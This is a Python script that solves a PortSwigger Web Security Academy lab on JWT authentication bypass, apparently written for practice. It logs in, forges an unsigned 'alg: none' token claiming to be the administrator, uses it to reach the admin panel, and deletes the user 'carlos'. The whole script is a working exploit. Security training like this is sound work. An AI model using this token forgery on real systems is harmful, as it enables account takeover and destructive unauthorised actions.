from lxml import html
import jwt
import requests
from rich.console import Console

session = requests.Session()
SERVER = "https://0a4b007303fced9782a238ac00750030.web-security-academy.net"

def get_csrf_token(endpoint):
    page = session.get(f"{SERVER}/{endpoint}")
    csrf_token = html.fromstring(page.content).xpath('//input[@name="csrf"]/@value')[0]
    return csrf_token


def do_login(username, password):
    csrf_token = get_csrf_token("login")
    response = session.post(f"{SERVER}/login", data={"csrf":csrf_token, "username":username, "password":password})
    return response.status_code


def main():
    console = Console()
    jwt_cookie = None
    forged_jwt_cookie = None

    with console.status("Logging in"):
        console.log(f"Login status: {do_login("wiener", "peter")}")
    
    with console.status("Retrieving JWT Cookie"):
        jwt_cookie = session.cookies.get_dict()["session"]
        console.log(f"[magenta]JWT Cookie[/magenta]: {jwt_cookie}")

    ''' 
    We know that the JWT has the following structure
        HEADERS: {
            "alg": <something>,
            "kid": <something>
        }

        PAYLOAD: {
            "iss": "portswigger",
            "exp": <some-timestamp>,
            "sub": <a-username>
        }
    '''
    with console.status("Building forged JWT cookie"):
        original_headers = jwt.get_unverified_header(jwt_cookie)
        original_payload = jwt.decode(jwt_cookie, options={"verify_signature": False})
        kid = original_headers["kid"]
        iss = original_payload["iss"]
        exp = original_payload["exp"]
        forged_headers = {"alg": "none", "kid": kid}
        forged_payload = {"iss": iss, "exp": exp, "sub": "administrator"}
        forged_jwt_cookie = jwt.encode(forged_payload, None, headers=forged_headers)
        console.log(f"[magenta]Forged JWT Cookie[/magenta]: {forged_jwt_cookie}")

    with console.status("Replacing session cookie (JWT)"):
        session.cookies.update({"session": forged_jwt_cookie})
    
    admin_page = session.get(f"{SERVER}/admin")

    # The following is useless since we can manually peek inside the html and get the endpoint
    # Only an excuse to practice with xpath
    delete_carlos_endpoint = html.fromstring(admin_page.content).xpath('//span[starts-with(text(), "carlos")]/../a/@href')[0]
    console.log(f"[magenta]Delete carlos endpoint[/magenta]: {delete_carlos_endpoint}")
    delete_response = session.get(f"{SERVER}{delete_carlos_endpoint}")
    console.log(f"[magenta]Delete response[/magenta]: {delete_response.status_code}")


if __name__ == "__main__":
    main()